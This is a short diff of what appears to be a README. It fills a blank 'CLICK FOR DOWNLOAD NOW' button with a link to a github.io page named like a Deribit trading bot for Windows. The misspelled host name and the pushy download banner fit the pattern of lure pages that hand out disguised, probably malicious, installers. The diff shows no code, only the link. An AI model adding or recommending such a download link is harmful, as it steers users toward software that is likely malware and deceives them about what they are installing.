@@ -4,7 +4,7 @@
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://deribit-trag-bot-pcwin-ub90.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
